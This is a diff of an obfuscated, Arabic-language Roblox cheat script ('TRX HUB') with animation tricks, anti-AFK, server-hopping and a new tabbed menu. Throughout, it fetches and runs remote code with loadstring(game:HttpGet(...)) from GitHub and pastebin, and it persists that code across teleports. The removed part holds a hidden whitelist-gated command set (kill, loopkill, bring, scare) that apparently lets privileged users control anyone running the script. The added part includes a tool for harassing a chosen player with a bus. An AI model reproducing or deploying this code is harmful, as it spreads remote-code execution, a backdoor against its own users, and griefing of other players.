-                    v818:Stop()
-                else
-                    v818:Stop()
-                    getgenv().idkjustcheck = true
-                end
-            end
-            if getgenv().idkjustcheck then
-                getgenv().idkjustcheck = false
-            else
-                local v819 = game.Players.LocalPlayer.Character:WaitForChild("Humanoid"):LoadAnimation(v814)
-                v819.Priority = Enum.AnimationPriority.Action
-                v819.Looped = false
-                v819:Play()
-                v819.TimePosition = 1
-                v819:AdjustSpeed(0)
-            end
-        else
-            SendNotify("System TRX", "\239\191\189\216\172\216\168 \216\167\217\134 \216\170\217\131\217\136\217\134 R6", 7)
-            return
-        end
-    end)
-    getgenv().JerkingAnimationR6.MouseButton1Click:Connect(function()
-        if game.Players.LocalPlayer.Character.Humanoid.RigType == Enum.HumanoidRigType.R6 then
-            getgenv().idkjustcheck = false
-            local v820 = Instance.new("Animation")
-            v820.AnimationId = "rbxassetid://204292303"
-            local v821 = Instance.new("Animation")
-            v821.AnimationId = "rbxassetid://181526230"
-            local v822, v823, v824 = pairs(game.Players.LocalPlayer.Character.Humanoid:GetPlayingAnimationTracks())
-            while true do
-                local v825
-                v824, v825 = v822(v823, v824)
-                if v824 == nil then
-                    break
-                end
-                if v825.Animation.AnimationId == v820.AnimationId or v825.Animation.AnimationId == v821.AnimationId then
-                    v825:Stop()
-                    getgenv().idkjustcheck = true
-                else
-                    v825:Stop()
-                end
-            end
-            if getgenv().idkjustcheck then
-                getgenv().idkjustcheck = false
-            else
-                local v826 = game.Players.LocalPlayer.Character:WaitForChild("Humanoid")
-                local v827 = v826:LoadAnimation(v820)
-                v827.Priority = Enum.AnimationPriority.Action
-                v827.Looped = true
-                v827:Play(0.1, 1, 3)
-                Track1 = v826:LoadAnimation(v821)
-                Track1.Priority = Enum.AnimationPriority.Action
-                Track1.Looped = true
-                Track1:Play(0.1, 1, 1)
-            end
-        else
-            SendNotify("System TRX", "\239\191\189\216\172\216\168 \216\167\217\134 \216\170\217\131\217\136\217\134 R6", 7)
-            return
-        end
-    end)
-    getgenv().BackpackHeadAnimationR6.MouseButton1Click:Connect(function()
-        if game.Players.LocalPlayer.Character.Humanoid.RigType == Enum.HumanoidRigType.R6 then
-            getgenv().idkjustcheck = false
-            local v828 = Instance.new("Animation")
-            v828.AnimationId = "rbxassetid://68339848"
-            local v829, v830, v831 = pairs(game.Players.LocalPlayer.Character.Humanoid:GetPlayingAnimationTracks())
-            while true do
-                local v832
-                v831, v832 = v829(v830, v831)
-                if v831 == nil then
-                    break
-                end
-                if v832.Animation.AnimationId ~= v828.AnimationId then
-                    v832:Stop()
-                else
-                    v832:Stop()
-                    getgenv().idkjustcheck = true
-                end
-            end
-            if getgenv().idkjustcheck then
-                getgenv().idkjustcheck = false
-            else
-                local v833 = game.Players.LocalPlayer.Character:WaitForChild("Humanoid"):LoadAnimation(v828)
-                v833.Priority = Enum.AnimationPriority.Action
-                v833.Looped = false
-                v833:Play()
-                v833.TimePosition = 1
-                v833:AdjustSpeed(0)
-            end
-        else
-            SendNotify("System TRX", "\239\191\189\216\172\216\168 \216\167\217\134 \216\170\217\131\217\136\217\134 R6", 7)
-            return
-        end
-    end)
-    getgenv().InsaneAnimationR6.MouseButton1Click:Connect(function()
-        if game.Players.LocalPlayer.Character.Humanoid.RigType == Enum.HumanoidRigType.R6 then
-            getgenv().idkjustcheck = false
-            local v834 = Instance.new("Animation")
-            v834.AnimationId = "rbxassetid://33796059"
-            local v835, v836, v837 = pairs(game.Players.LocalPlayer.Character.Humanoid:GetPlayingAnimationTracks())
-            while true do
-                local v838
-                v837, v838 = v835(v836, v837)
-                if v837 == nil then
-                    break
-                end
-                if v838.Animation.AnimationId ~= v834.AnimationId then
-                    v838:Stop()
-                else
-                    v838:Stop()
-                    getgenv().idkjustcheck = true
-                end
-            end
-            if getgenv().idkjustcheck then
-                getgenv().idkjustcheck = false
-            else
-                local v839 = game.Players.LocalPlayer.Character:WaitForChild("Humanoid"):LoadAnimation(v834)
-                v839.Priority = Enum.AnimationPriority.Action
-                v839.Looped = true
-                v839:Play()
-                v839:AdjustSpeed(10)
-            end
-        else
-            SendNotify("System TRX", "\239\191\189\216\172\216\168 \216\167\217\134 \216\170\217\131\217\136\217\134 R6", 7)
-            return
-        end
-    end)
-    getgenv().HugAnimationR15.MouseButton1Click:Connect(function()
-        if game.Players.LocalPlayer.Character.Humanoid.RigType == Enum.HumanoidRigType.R15 then
-            getgenv().idkjustcheck = false
-            local v840 = Instance.new("Animation")
-            v840.AnimationId = "rbxassetid://10714377090"
-            local v841, v842, v843 = pairs(game.Players.LocalPlayer.Character.Humanoid:GetPlayingAnimationTracks())
-            while true do
-                local v844
-                v843, v844 = v841(v842, v843)
-                if v843 == nil then
-                    break
-                end
-                if v844.Animation.AnimationId ~= v840.AnimationId then
-                    v844:Stop()
-                else
-                    v844:Stop()
-                    getgenv().idkjustcheck = true
-                end
-            end
-            if getgenv().idkjustcheck then
-                getgenv().idkjustcheck = false
-            else
-                local v845 = game.Players.LocalPlayer.Character:WaitForChild("Humanoid"):LoadAnimation(v840)
-                v845.Priority = Enum.AnimationPriority.Action
-                v845.Looped = false
-                v845:Play()
-                v845.TimePosition = 0.48
-                v845:AdjustSpeed(0)
-            end
-        else
-            SendNotify("System TRX", "\239\191\189\216\172\216\168 \216\167\217\134 \216\170\217\131\217\136\217\134 R15", 7)
-            return
-        end
-    end)
-    vu308.MouseButton1Click:Connect(function()
-        ChangeToggleColor(vu308)
-        if vu308.Ticket_Asset.ImageColor3 ~= Color3.fromRGB(0, 255, 0) then
-            _G.AntiFlingToggled = false
-        else
-            _G.AntiFlingToggled = true
-            loadstring(game:HttpGet("https://raw.githubusercontent.com/H20CalibreYT/SystemBroken/main/AntiFling"))()
-        end
-    end)
-    local vu846 = false
-    vu309.MouseButton1Click:Connect(function()
-        ChangeToggleColor(vu309)
-        if vu309.Ticket_Asset.ImageColor3 == Color3.fromRGB(0, 255, 0) then
-            SendNotify("System TRX", "\239\191\189\217\134 \216\167\217\132\217\133\217\133\217\131\217\134 \216\167\217\132\217\133\216\182\216\167\216\175 \217\133\216\167\217\138\217\131\216\180\217\129 \216\168\216\185\216\182 \216\167\217\134\217\136\216\167\216\185 \216\179\217\131\216\177\216\168\216\170\216\167\216\170 \216\167\217\132\216\167\216\186\216\170\216\181\216\167\216\168", 7)
-            repeat
-                pcall(function()
-                    workspace.FallenPartsDestroyHeight = 0 / 0
-                    Character = vu38.Character
-                    local v847 = Character
-                    if v847 then
-                        v847 = Character:FindFirstChildWhichIsA("Humanoid")
-                    end
-                    Humanoid = v847
-                    local v848 = Humanoid
-                    if v848 then
-                        v848 = Humanoid.RootPart
-                    end
-                    RootPart = v848
-                    if vu160() and (Humanoid and (RootPart and not vu846)) then
-                        vu846 = true
-                        local v849 = RootPart.Velocity.Magnitude < 50 and RootPart.CFrame or vu46.Focus
-                        local v850 = tick()
-                        repeat
-                            RootPart.CFrame = CFrame.new(0, - 499, 0) * CFrame.Angles(math.rad(90), 0, 0)
-                            RootPart.AssemblyLinearVelocity = Vector3.new()
-                            task.wait()
-                        until tick() > v850 + 1
-                        RootPart.AssemblyLinearVelocity = Vector3.new()
-                        RootPart.CFrame = v849
-                        Humanoid:ChangeState(Enum.HumanoidStateType.GettingUp)
-                        vu846 = false
-                    end
-                end)
-                task.wait()
-            until vu309.Ticket_Asset.ImageColor3 == Color3.fromRGB(255, 0, 0)
-            workspace.FallenPartsDestroyHeight = - 500
-        end
-    end)
-    local vu851 = nil
-    vu310.MouseButton1Click:Connect(function()
-        ChangeToggleColor(vu310)
-        if vu310.Ticket_Asset.ImageColor3 ~= Color3.fromRGB(0, 255, 0) then
-            vu851:Disconnect()
-        else
-            vu851 = vu38.Idled:Connect(function()
-                local v852 = game:GetService("VirtualUser")
-                v852:CaptureController()
-                v852:ClickButton2(Vector2.new())
-            end)
-        end
-    end)
-    vu311.MouseButton1Click:Connect(function()
-        ChangeToggleColor(vu311)
-        if vu311.Ticket_Asset.ImageColor3 ~= Color3.fromRGB(0, 255, 0) then
-            local v853 = vu39
-            local v854, v855, v856 = pairs(v853:GetChildren())
-            while true do
-                local v857
-                v856, v857 = v854(v855, v856)
-                if v856 == nil then
-                    break
-                end
-                v857:Destroy()
-            end
-            vu39.Brightness = 2
-            vu39.ExposureCompensation = 0
-        else
-            local v858 = Instance.new("Sky")
-            local v859 = Instance.new("BloomEffect")
-            local v860 = Instance.new("BlurEffect")
-            local v861 = Instance.new("ColorCorrectionEffect")
-            local v862 = Instance.new("SunRaysEffect")
-            vu39.Brightness = 2.25
-            vu39.ExposureCompensation = 0.1
-            vu39.ClockTime = 17.55
-            v858.SkyboxBk = "http://www.roblox.com/asset/?id=144933338"
-            v858.SkyboxDn = "http://www.roblox.com/asset/?id=144931530"
-            v858.SkyboxFt = "http://www.roblox.com/asset/?id=144933262"
-            v858.SkyboxLf = "http://www.roblox.com/asset/?id=144933244"
-            v858.SkyboxRt = "http://www.roblox.com/asset/?id=144933299"
-            v858.SkyboxUp = "http://www.roblox.com/asset/?id=144931564"
-            v858.StarCount = 5000
-            v858.SunAngularSize = 5
-            v858.Parent = vu39
-            v859.Intensity = 0.3
-            v859.Size = 10
-            v859.Threshold = 0.8
-            v859.Parent = vu39
-            v860.Size = 5
-            v860.Parent = vu39
-            v861.Brightness = 0
-            v861.Contrast = 0.1
-            v861.Saturation = 0.25
-            v861.TintColor = Color3.fromRGB(255, 255, 255)
-            v861.Parent = vu39
-            v862.Intensity = 0.1
-            v862.Spread = 0.8
-            v862.Parent = vu39
-        end
-    end)
-    v312.MouseButton1Click:Connect(function()
-        if vu311.Ticket_Asset.ImageColor3 ~= Color3.fromRGB(255, 0, 0) then
-            SendNotify("System TRX", "\239\191\189\216\172\216\167\216\161\216\167 \217\130\217\133 \216\168\216\167\216\183\217\129\216\167\216\161 \216\167\217\132\216\180\216\167\216\175\216\177", 5)
-        else
-            game:GetService("Lighting").ClockTime = 14
-        end
-    end)
-    v313.MouseButton1Click:Connect(function()
-        if vu311.Ticket_Asset.ImageColor3 ~= Color3.fromRGB(255, 0, 0) then
-            SendNotify("System VR7", "\239\191\189\216\172\216\167\216\161\216\167 \217\130\217\133 \216\168\216\167\216\183\217\129\216\167\216\161 \216\167\217\132\216\180\216\167\216\175\216\177", 5)
-        else
-            game:GetService("Lighting").ClockTime = 19
-        end
-    end)
-    v315.MouseButton1Click:Connect(function()
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
-    end)
-    v318.MouseButton1Click:Connect(function()
-        if not vu44 then
-            vu44 = true
-            SendNotify("System TRX", "\239\191\189\216\167\216\177\217\138 \216\170\216\173\217\133\217\138\217\132 \216\167\217\132\216\179\217\131\216\177\216\168\216\170.\nEdited By: Hussien#5033")
-            loadstring(game:HttpGet("https://raw.githubusercontent.com/Hm5011/hussain/refs/heads/main/Free%20Dances"))()
-        end
-    end)
-    v314.MouseButton1Click:Connect(function()
-        if queue_on_teleport then
-            queue_on_teleport("loadstring(game:HttpGet(\"https://raw.githubusercontent.com/VR7ss/OMK/refs/heads/main/VR7-ON-TOP\"))()")
-        end
-        game:GetService("TeleportService"):TeleportCancel()
-        wait(0.1)
-        game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId, vu38)
-    end)
-    v317.MouseButton1Click:Connect(function()
-        SendNotify("System TRX", " \217\132\216\167\217\138\217\136\216\172\216\175 \216\167\216\185\217\132\216\167\217\134 \216\173\216\167\217\132\217\138\216\167\n \216\167\216\176\216\167 \216\170\216\168\217\138 \217\134\216\185\217\132\217\134 \217\132\217\131 \216\170\217\129\216\182\217\132 \216\175\216\179\217\131\217\136\216\177\216\175 VR7", 5)
-    end)
-    v316.MouseButton1Click:Connect(function()
-        if queue_on_teleport then
-            queue_on_teleport("loadstring(game:HttpGet(\"https://raw.githubusercontent.com/VR7ss/OMK/refs/heads/main/VR7-ON-TOP\"))()")
-        end
-        local v863 = {
-            MaxStore = 3600,
-            CheckInterval = 1,
-            TeleportInterval = 1
-        }
-        local vu864 = game:GetService("HttpService")
-        local v865 = game:GetService("TeleportService")
-        local v866 = game:GetService("Players").LocalPlayer
-        local v867 = game.PlaceId
-        local v868 = game.JobId
-        local v869 = "ServerHop"
-        local v870 = string.format("%s\\%s.json", v869, tostring(v867))
-        local v871 = {
-            Start = tick(),
-            Jobs = {}
-        }
-        if not isfolder(v869) then
-            makefolder(v869)
-        end
-        local v872
-        if isfile(v870) then
-            v872 = vu864:JSONDecode(readfile(v870))
-            if tick() - v872.Start >= v863.MaxStore then
-                v872 = v871
-            end
-        else
-            v872 = v871
-        end
-        if not table.find(v872.Jobs, v868) then
-            table.insert(v872.Jobs, v868)
-        end
-        writefile(v870, vu864:JSONEncode(v872))
-        local v873 = ""
-        local v874 = {}
-        while v873 and (# v874 <= 0 and task.wait(v863.CheckInterval / 1000)) do
-            local vu875 = (request or vu864.RequestAsync)({
-                Url = "https://games.roblox.com/v1/games/" .. v867 .. "/servers/Public?sortOrder=Desc&limit=100&excludeFullGames=true&cursor=" .. v873,
-                Method = "GET"
+    })
+
+
+    InfoTab:AddParagraph({"مرحباً في FR HUB 💚","السكربت الخاص بالمطورين"})
+    InfoTab:AddButton({
+        Name="📋  زر الانفو",
+        Callback=function()
+            Window:Dialog({
+                Title="💚  TRX HUB",
+                Text="مرحبا بك في السكربت الخاص ب المطورين FR\n\n  TRX  l SA صنع الدارك بقيادة المطور   TRX\n\nالرجاء استمتع بمشاهده الاسكربت 😍🫶🏻💕",
+                Options={{"حسناً ✓"}}
             })
-            local v876, v877 = pcall(function()
-                return vu864:JSONDecode(vu875.Body)
+        end
+    })
+    InfoTab:AddSection("معلومات السكربت")
+    InfoTab:AddParagraph({"الإصدار","TRX HUB v2.0  |  by TRXالدارك مع تعاون  &  FR"})
+    InfoTab:AddSection("بطاقة اللاعب")
+    local uid   = tostring(LocalPlayer.UserId)
+    local uname = LocalPlayer.Name
+    local dname = LocalPlayer.DisplayName
+    InfoTab:AddParagraph({"👤 اسم اللاعب", uname .. (dname~=uname and ("  ("..dname..")") or "")})
+    InfoTab:AddParagraph({"🆔 الـ ID", uid})
+    InfoTab:AddParagraph({"🖼️ صورة الحساب","rbxthumb://type=AvatarHeadShot&id="..uid.."&w=150&h=150"})
+    InfoTab:AddButton({
+        Name="📋 نسخ الـ ID",
+        Callback=function()
+            pcall(function() setclipboard(uid) end)
+            Notify("تم","تم نسخ الـ ID: "..uid,3)
+        end
+    })
+    InfoTab:AddButton({
+        Name="🔗 فتح بروفايل الروبلوكس",
+        Callback=function()
+            Notify("بروفايل","UID: "..uid.." | "..uname,4)
+        end
+    })
+    InfoTab:AddSection("🎭 اسم فوق الراس (RP Name)")
+    InfoTab:AddButton({
+        Name="✅ تفعيل اسم فوق الراس TRX SCRIPT",
+        Callback=function()
+            pcall(function()
+                local argsName = {"RolePlayName","- TRX SCRIPT IS NOW -"}
+                game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1RPNam1eTex1t"):FireServer(unpack(argsName))
+                local argsColor = {"PickingRPNameColor", Color3.new(0.7556330561637878, 0, 0.00002125852188328281)}
+                game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1RPNam1eColo1r"):FireServer(unpack(argsColor))
             end)
-            if not (v876 and (v877 and v877.data)) then
-                break
-            end
-            local v878, v879, v880 = pairs(v877.data)
-            while true do
-                local v881
-                v880, v881 = v878(v879, v880)
-                if v880 == nil then
-                    break
-                end
-                if typeof(v881) == "table" and (v881.id and (tonumber(v881.playing) and (tonumber(v881.maxPlayers) and (v881.playing < v881.maxPlayers and not table.find(v872.Jobs, v881.id))))) then
-                    table.insert(v874, 1, v881.id)
-                end
-            end
-            v873 = v877.nextPageCursor or nil
+            Notify("RP Name","تم تفعيل اسم فوق الراس: -  TRX SCRIPT IS NOW -",3)
         end
-        while # v874 > 0 and task.wait(v863.TeleportInterval / 1000) do
-            v865:TeleportToPlaceInstance(v867, v874[math.random(1, # v874)], v866)
-        end
-    end)
-    vu319.FocusLost:Connect(function()
-        Send(vu94(vu319.Text))
-        vu319.Text = ""
-    end)
-    game:GetService("Players").PlayerAdded:Connect(function(p882)
-        if ChatRepeaterEnabled and p882 ~= game:GetService("Players").LocalPlayer then
-            local v884 = p882.Chatted:Connect(function(p883)
-                Send(p883)
+    })
+    local rpNameInput=""
+    InfoTab:AddTextBox({Name="اكتب اسم فوق الراس",PlaceholderText="اسمك هنا",RemoveTextAfterFocusLost=false,Callback=function(v) rpNameInput=v end})
+    InfoTab:AddButton({
+        Name="📝 تغيير اسم فوق الراس",
+        Callback=function()
+            if rpNameInput=="" then Notify("خطأ","اكتب الاسم أولاً!",3); return end
+            pcall(function()
+                game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1RPNam1eTex1t"):FireServer("RolePlayName",rpNameInput)
             end)
-            table.insert(vu45, v884)
+            Notify("RP Name","تم تغيير الاسم إلى: "..rpNameInput,3)
         end
-    end)
-    v322.MouseButton1Click:Connect(function()
-        local v885 = game.Players.LocalPlayer
-        local vu886 = Instance.new("ScreenGui", v885:WaitForChild("PlayerGui"))
-        vu886.ResetOnSpawn = false
-        vu886.IgnoreGuiInset = true
-        local v887, v888, v889 = pairs(game.CoreGui:GetDescendants())
-        local vu890 = {}
-        while true do
-            local v891
-            v889, v891 = v887(v888, v889)
-            if v889 == nil then
-                break
+    })
+
+
+    local SamlaScripts={
+        {"اافك2","https://raw.githubusercontent.com/FaresXForest/afk/refs/heads/main/SMLH200%23/smlh322%23/bestantiafk"},
+        {"افك 3","https://raw.githubusercontent.com/FaresXForest/antiafk-by-flex-and-fares/refs/heads/main/faresxflex"},
+        {"منع طرد 4",".https://raw.githubusercontent.com/FaresXForest/Antikick/refs/heads/main/Kick"},
+        {"صمله 5","https://pastebin.com/raw/x4ZqfXHr"},
+    }
+    SamlaTab:AddSection("اختر الصمله")
+    for _,v in ipairs(SamlaScripts) do
+        local name,url=v[1],v[2]
+        SamlaTab:AddButton({Name=name,Callback=function()
+            Notify("الصمله","جاري تحميل "..name.."...",2)
+            pcall(function() loadstring(game:HttpGet(url))() end)
+        end})
+    end
+
+
+    TrollTab:AddSection("تخريب بالباص")
+    local sabotageTarget
+    TrollTab:AddDropdown({
+        Name="اختيار لاعب",
+        Options=(function() local t={}; for _,v in ipairs(Players:GetPlayers()) do if v~=LocalPlayer then table.insert(t,v.Name) end end; return t end)(),
+        Callback=function(v) sabotageTarget=v end
+    })
+    TrollTab:AddButton({
+        Name="تخريب بالباص",
+        Callback=function()
+            if not sabotageTarget then Notify("خطأ","اختر لاعب أولاً!",3); return end
+            local target=Players:FindFirstChild(sabotageTarget)
+            if not target then Notify("خطأ","اللاعب غير موجود!",3); return end
+            local char=LocalPlayer.Character; local hrp=char and char:FindFirstChild("HumanoidRootPart"); if not hrp then return end
+            local originalPos=hrp.CFrame
+            local function getBus() local v=workspace:FindFirstChild("Vehicles"); return v and v:FindFirstChild(LocalPlayer.Name.."Car") end
+            local bus=getBus()
+            if not bus then
+                hrp.CFrame=CFrame.new(1118.81,75.998,-1138.61); task.wait(0.4)
+                ReplicatedStorage.RE["1Ca1r"]:FireServer("PickingCar","SchoolBus"); task.wait(1); bus=getBus()
             end
-            if v891:IsA("ScreenGui") and (v891 ~= vu886 and v891.Enabled) then
-                table.insert(vu890, v891)
-                v891.Enabled = false
+            if bus and bus:FindFirstChild("Body") then
+                local seat=bus.Body:FindFirstChild("VehicleSeat")
+                if seat then repeat hrp.CFrame=seat.CFrame*CFrame.new(0,2,0); task.wait() until char.Humanoid.Sit end
             end
-        end
-        local v892, v893, v894 = pairs(game.Players.LocalPlayer.PlayerGui:GetDescendants())
-        while true do
-            local v895
-            v894, v895 = v892(v893, v894)
-            if v894 == nil then
-                break
-            end
-            if v895:IsA("ScreenGui") and (v895 ~= vu886 and v895.Enabled) then
-                table.insert(vu890, v895)
-                v895.Enabled = false
-            end
-        end
-        local v896 = Instance.new("Frame", vu886)
-        v896.Size = UDim2.new(1, 0, 1, 0)
-        v896.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-        v896.BorderSizePixel = 0
-        v896.ZIndex = 10
-        local v897 = Instance.new("TextLabel", v896)
-        v897.Size = UDim2.new(0.8, 0, 0.6, 0)
-        v897.Position = UDim2.new(0.1, 0, 0.2, 0)
-        v897.Text = loadstring(game:HttpGet("https://raw.githubusercontent.com/Hm5011/hussain/refs/heads/main/Warn%20Message"))()
-        v897.TextColor3 = Color3.fromRGB(vu31, vu32, vu33)
-        v897.TextScaled = true
-        v897.BackgroundTransparency = 1
-        v897.Font = Enum.Font.SourceSansBold
-        v897.TextWrapped = true
-        v897.ZIndex = 11
-        local v898 = Instance.new("TextLabel", v896)
-        v898.Size = UDim2.new(0.2, 0, 0.1, 0)
-        v898.Position = UDim2.new(0.05, 0, 0.85, 0)
-        v898.TextColor3 = Color3.fromRGB(vu31, vu32, vu33)
-        v898.TextScaled = true
-        v898.BackgroundTransparency = 1
-        v898.Font = Enum.Font.SourceSansBold
-        v898.Text = "20"
-        v898.ZIndex = 12
-        for v899 = 20, 0, - 1 do
-            v898.Text = tostring(v899)
-            wait(1)
-        end
-        pcall(function()
-            vu886:Destroy()
-            local v900, v901, v902 = pairs(vu890)
-            while true do
-                local v903
-                v902, v903 = v900(v901, v902)
-                if v902 == nil then
-                    break
+            task.spawn(function()
+                while bus and target.Character do
+                    local thrp=target.Character:FindFirstChild("HumanoidRootPart")
+                    if thrp then local t2=tick()*35; bus:SetPrimaryPartCFrame(thrp.CFrame*CFrame.new(math.sin(t2)*4,0,math.cos(t2)*20)) end
+                    RunService.RenderStepped:Wait()
                 end
-                v903.Enabled = true
-            end
-        end)
-    end)
-    vu37.PlayerRemoving:Connect(function(pu904)
-        pcall(function()
-            if pu904.Name == vu41 then
-                UpdateTarget(nil)
-                SendNotify("System VR7", "\239\191\189\217\132\216\167\216\185\216\168 \216\174\216\177\216\172 \216\167\217\136 \216\183\217\132\216\185 \217\136\216\175\216\174\217\132.", 5)
-            end
-        end)
-    end)
-    vu38.CharacterAdded:Connect(function(p905)
-        task.wait(GetPing() + 0.1)
-        p905:WaitForChild("Humanoid")
-        if vu43 ~= nil then
-            TeleportTO(vu43.X, vu43.Y, vu43.Z, "pos", "safe")
+                ReplicatedStorage.RE["1Ca1r"]:FireServer("DeleteAllVehicles"); hrp.CFrame=originalPos
+            end)
+            Notify("التخريب","بدأ التخريب على "..sabotageTarget,3)
         end
-        if vu259.Ticket_Asset.ImageColor3 == Color3.fromRGB(0, 255, 0) then
-            ChangeToggleColor(vu259)
-            vu628 = false
-            vu329.Visible = false
-            vu631:Disconnect()
-            vu632:Disconnect()
-            SendNotify("System TRX ", "\239\191\189\217\133 \216\167\217\138\217\130\216\167\217\129 \216\167\217\132\216\183\217\138\216\177\216\167\217\134 \216\168\216\179\216\168\216\168 \216\167\217\134\217\131 \217\130\216\175 \217\133\216\170", 5)
-        end
-    end)
-    v335.MouseButton1Click:Connect(function()
-        vu221.Visible = not vu221.Visible
-    end)
-    game:GetService("UserInputService").InputBegan:Connect(function(p906, p907)
-        if not p907 then
-            if p906.KeyCode == Enum.KeyCode.B then
-                vu221.Visible = not vu221.Visible
+    })
+
+    TrollTab:AddSection("تنقل الاكسسوارات")
+    TrollTab:AddButton({
+        Name="تنقل الاكسسوارات في ايدك",
+        Callback=function()
+            local lp = game.Players.LocalPlayer
+            local char = lp.Character
+            for i, v in pairs(char:GetChildren()) do
+                if v:IsA("BallSocketConstraint") then v:Destroy() end
             end
-        end
-    end)
-    vu221:TweenPosition(UDim2.new(0.5, 0, 0.5, 0))
-    pcall(function()
-        if not _G.Zarba then
-            _G.Zarba = true
-            local v1058 = (function()
-                local v908 = {
-                    Default = "000000",
-                    Aqua = "1ABC9C",
-                    DarkAqua = "11806A",
-                    Green = "57F287",
-                    DarkGreen = "1F8B4C",
-                    Blue = "3498DB",
-                    DarkBlue = "206694",
-                    Purple = "9B59B6",
-                    DarkPurple = "71368A",
-                    LuminousVividPink = "E91E63",
-                    DarkVividPink = "AD1457",
-                    Gold = "F1C40F",
-                    DarkGold = "C27C0E",
-                    Orange = "E67E22",
-                    DarkOrange = "A84300",
-                    Red = "ED4245",
-                    DarkRed = "992D22",
-                    Grey = "95A5A6",
-                    DarkGrey = "979C9F",
-                    DarkerGrey = "7F8C8D",
-                    LightGrey = "BCC0C0",
-                    Navy = "34495E",
-                    DarkNavy = "2C3E50",
-                    Yellow = "FFFF00",
-                    White = "FFFFFF",
-                    Greyple = "99AAb5",
-                    Black = "23272A",
-                    DarkButNotBlack = "2C2F33",
-                    NotQuiteBlack = "23272A",
-                    Blurple = "5865F2",
-                    Fuchsia = "EB459E"
-                }
-                if table.find(loadstring(game:HttpGet("https://gist.githubusercontent.com/nkjvnkj-commits/c378622870e9adca0cbc876b9c697c7e/raw/d8acd73662dcd2458fa9397cb54969f5540f9df5/gistfile1.txt"))(), tostring(game.Players.LocalPlayer.UserId)) then
-                    game:GetService("StarterGui"):SetCore("SendNotification", {
-                        Title = "TRX Team",
-                        Text = "\239\191\189\217\134\216\170 \217\133\216\173\217\133\217\138 \217\133\217\134 \216\172\217\133\217\138\216\185 \216\167\217\132\216\167\217\136\216\167\217\133\216\177\n\217\136\217\138\217\133\217\131\217\134\217\131 \216\167\216\179\216\170\216\174\216\175\216\167\217\133 \216\167\217\132\216\167\217\136\216\167\217\133\216\177 \216\185\217\132\217\137 \216\167\217\132\217\134\216\167\216\179",
-                        Duration = 13,
-                        Icon = "rbxassetid://136772242182146"
-                    })
-                    local vu909 = Instance.new("Sound", game.Workspace)
-                    vu909.SoundId = "rbxassetid://1862047553"
-                    vu909.Volume = 10
-                    vu909.Ended:Connect(function()
-                        vu909:Destroy()
-                    end)
-                    local v910 = vu909
-                    vu909.Play(v910)
-                    return {
-                        Color = tonumber("0x" .. v908.Aqua),
-                        Type = "Diamond User"
-                    }
-                end
-                if not table.find(loadstring(game:HttpGet("https://raw.githubusercontent.com88013442177ss/OMK/refs/heads/main/Usernames"))(), tostring(game.Players.LocalPlayer.UserId)) then
-                    pcall(function()
-                        if game.CreatorId == 8801344217 and string.find(game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name, "\239\191\189\216\167\216\170") or (game.CreatorId == 4001902 and string.find(game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name, "Mohammad") or game.CreatorId == 14940374 and string.find(game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name, "Rob")) then
-                            local vu1038 = {
-                                bring = function(p911, p912)
-                                    local v913 = vu142(tostring(p912))
-                                    local v914 = vu138(tostring(p911))
-                                    if v914 and v914.Character and (v914.Character:FindFirstChild("HumanoidRootPart") and p912 == "") or v913 == game.Players.LocalPlayer then
-                                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v914.Character.HumanoidRootPart.CFrame
-                                    end
-                                end,
-                                kill = function(_, p915)
-                                    local v916 = vu142(tostring(p915))
-                                    if p915 == "" or v916 == game.Players.LocalPlayer then
-                                        game.Players.LocalPlayer.Character.Humanoid.Health = 0
-                                    end
-                                end,
-                                loopkill = function(_, p917)
-                                    local v918 = vu142(tostring(p917))
-                                    if p917 == "" or v918 == game.Players.LocalPlayer then
-                                        getgenv().loopkillme = true
-                                        while getgenv().loopkillme do
-                                            wait(0.1)
-                                            pcall(function()
-                                                if game.Players.LocalPlayer.Character and (game.Players.LocalPlayer.Character:FindFirstChild("Humanoid") and game.Players.LocalPlayer.Character.Humanoid.Health > 0) then
-                                                    task.wait(0.3)
-                                                    game.Players.LocalPlayer.Character.Humanoid.Health = 0
-                                                end
-                                            end)
-                                        end
-                                    end
-                                end,
-                                unloopkill = function(_, p919)
-                                    local v920 = vu142(tostring(p919))
-                                    if p919 == "" or v920 == game.Players.LocalPlayer then
-                                        getgenv().loopkillme = false
-                                    end
-                                end,
-                                loopbring = function(p921, p922)
-                                    local v923 = vu142(tostring(p922))
-                                    local vu924 = vu138(tostring(p921))
-                                    if p922 == "" or v923 == game.Players.LocalPlayer then
-                                        getgenv().loopbring = true
-                                        while getgenv().loopbring do
-                                            task.wait()
-                                            pcall(function()
-                                                if vu924 and vu924.Character and vu924.Character:FindFirstChild("HumanoidRootPart") then
-                                                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = vu924.Character.HumanoidRootPart.CFrame
-                                                end
-                                            end)
-                                        end
-                                    end
-                                end,
-                                unloopbring = function(_, p925)
-                                    local v926 = vu142(tostring(p925))
-                                    if p925 == "" or v926 == game.Players.LocalPlayer then
-                                        getgenv().loopbring = false
-                                    end
-                                end,
-                                scare = function(_, p927)
-                                    local v928 = vu142(tostring(p927))
-                                    if p927 == "" or v928 == game.Players.LocalPlayer then
-                                        local v929 = Instance.new("Sound", game.Players.LocalPlayer:FindFirstChildOfClass("PlayerGui"))
-                                        v929.SoundId = "rbxassetid://7111752052"
-                                        v929.Volume = 1
-                                        v929:Play()
-                                        v929.Loaded:Wait()
-                                        local v930 = Instance.new("ScreenGui", game.Players.LocalPlayer:FindFirstChildOfClass("PlayerGui"))
-                                        v930.IgnoreGuiInset = true
-                                        local v931 = Instance.new("ImageLabel", v930)
-                                        v931.Size = UDim2.new(1, 0, 1, 0)
-                                        v931.BackgroundTransparency = 1
-                                        v931.Image = "rbxassetid://4837991204"
-                                        game:GetService("Debris"):AddItem(v930, v929.TimeLength)
-                                        game:GetService("Debris"):AddItem(v929, v929.TimeLength)
-                                    end
-                                end,
-                                flash = function(_, p932)
-                                    local v933 = vu142(tostring(p932))
-                                    if p932 == "" or v933 == game.Players.LocalPlayer then
